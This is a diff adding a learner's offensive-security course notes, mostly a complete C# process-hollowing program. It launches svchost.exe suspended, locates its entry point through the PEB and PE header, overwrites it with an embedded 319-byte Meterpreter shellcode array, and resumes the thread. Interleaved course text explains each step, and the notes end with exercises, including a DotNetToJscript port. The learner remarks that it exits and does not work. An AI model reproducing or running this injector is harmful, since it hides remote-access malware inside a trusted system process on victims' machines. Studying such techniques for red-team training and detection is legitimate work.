+            out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+         private static extern int ZwQueryInformationProcess(IntPtr hProcess,
+             int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+             uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+             [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+        static void Main(string[] args)
+        {
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+             IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+            /*
+We can now call ZwQueryInformationProcess and fetch the address of the PEB from the
+PROCESS_BASIC_INFORMATION structure:
+            */
+
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            uint tmp = 0;
+            IntPtr hProcess = pi.hProcess;
+            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
+
+            //Following the DllImport, we can call ReadProcessMemory by specifying an 8-byte buffer that is 
+            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
+            //pointer using (IntPtr
+            byte[] addrBuf = new byte[IntPtr.Size];
+            IntPtr nRead = IntPtr.Zero;
+            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+            // parsing the PE HEader entrypoint
+            byte[] data = new byte[0x200];
+            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+            /*
+             * To implement this, we convert four bytes at offset 0x3C (e_lfanew field) to an unsigned integer.279
+As stated previously, this is the offset from the image base to the PE header structure.
+Next, we convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. This value 
+is the offset from the image base to the EntryPoint
+             */
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+            uint opthdr = e_lfanew_offset + 0x28;
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+            /*
+             The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual 
+address (RVA). We must add it to the image base to obtain the full memory address of the 
+EntryPoint. This is done on the last line of Listing 201.
+We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode 
+and use WriteProcessMemory to overwrite the existing code as shown in Listing 202. Remember 
+that we must add a DllImport statement for WriteProcessMemory before using it.
+             */
+
+            byte[] buf = new byte[319] {
+            0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
+            0xff,0xff,0x48,0xbb,0xb6,0x91,0x18,0x2b,0x1c,0x05,0x92,0x1b,0x48,0x31,0x58,
+            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x4a,0xd9,0x9b,0xcf,0xec,0xed,
+            0x52,0x1b,0xb6,0x91,0x59,0x7a,0x5d,0x55,0xc0,0x4a,0xe0,0xd9,0x29,0xf9,0x79,
+            0x4d,0x19,0x49,0xd6,0xd9,0x93,0x79,0x04,0x4d,0x19,0x49,0x96,0xd9,0x93,0x59,
+            0x4c,0x4d,0x9d,0xac,0xfc,0xdb,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xad,0x79,
+            0x57,0x1e,0x29,0xb2,0x5a,0x77,0x58,0x15,0x6a,0x1d,0xc4,0x70,0xf6,0xe4,0xd0,
+            0x49,0x63,0x97,0x57,0xb2,0x90,0xf4,0xad,0x50,0x2a,0xcc,0x8e,0x12,0x93,0xb6,
+            0x91,0x18,0x63,0x99,0xc5,0xe6,0x7c,0xfe,0x90,0xc8,0x7b,0x97,0x4d,0x8a,0x5f,
+            0x3d,0xd1,0x38,0x62,0x1d,0xd5,0x71,0x4d,0xfe,0x6e,0xd1,0x6a,0x97,0x31,0x1a,
+            0x53,0xb7,0x47,0x55,0x1a,0xd5,0x4d,0xa3,0xdb,0x1a,0xd0,0xd9,0xe2,0x11,0x44,
+            0x93,0xda,0x8e,0x71,0x6d,0xda,0x50,0x06,0xde,0x3f,0xbe,0xd4,0x21,0xfa,0x69,
+            0xdd,0xca,0x5f,0x3d,0xd1,0x3c,0x62,0x1d,0xd5,0xf4,0x5a,0x3d,0x9d,0x50,0x6f,
+            0x97,0x45,0x8e,0x52,0xb7,0x41,0x59,0xa0,0x18,0x8d,0xda,0x1a,0x66,0xd0,0x40,
+            0x6a,0x44,0x5b,0xcb,0x41,0xf7,0xc9,0x59,0x72,0x5d,0x5f,0xda,0x98,0x5a,0xb1,
+            0x59,0x79,0xe3,0xe5,0xca,0x5a,0xef,0xcb,0x50,0xa0,0x0e,0xec,0xc5,0xe4,0x49,
+            0x6e,0x45,0x63,0xa6,0x04,0x92,0x1b,0xb6,0x91,0x18,0x2b,0x1c,0x4d,0x1f,0x96,
+            0xb7,0x90,0x18,0x2b,0x5d,0xbf,0xa3,0x90,0xd9,0x16,0xe7,0xfe,0xa7,0xf5,0x27,
+            0xb9,0xe0,0xd0,0xa2,0x8d,0x89,0xb8,0x0f,0xe4,0x63,0xd9,0x9b,0xef,0x34,0x39,
+            0x94,0x67,0xbc,0x11,0xe3,0xcb,0x69,0x00,0x29,0x5c,0xa5,0xe3,0x77,0x41,0x1c,
+            0x5c,0xd3,0x92,0x6c,0x6e,0xcd,0x48,0x7d,0x69,0xf1,0x35,0xd3,0xe9,0x7d,0x2b,
+            0x1c,0x05,0x92,0x1b };
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+            /*
+             * Now that everything is set up correctly, we’ll start the execution of our shellcode. In the previous 
+techniques, we have called CreateRemoteThread to spin up a new thread but in this case, a thread 
+already exists and is waiting to execute our shellcode.
+We can use the Win32 ResumeThread280 API to let the suspended thread of a remote process 
+continue its execution. ResumeThread is an easy API to call since it only requires the handle of the 
+thread to resume as shown in its function prototype281 in Listing 203
+
+            when CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION 
+structure, it also copied the handle of the main thread into it. We can then import ResumeThread
+and call it directly
+             */
+
+            ResumeThread(pi.hThread);
+        }
+    }
+}
+
+```
+
+It is calling svchost but then exits
+
+### 5.4.2.1 Exercises
+1. Replicate the process hollowing technique using shellcode from C#.
+
+`svchost.exe` not working.
+
+2. Modify the code to generate a Jscript file using DotNetToJscript that performs process hollowing.
 
 
 
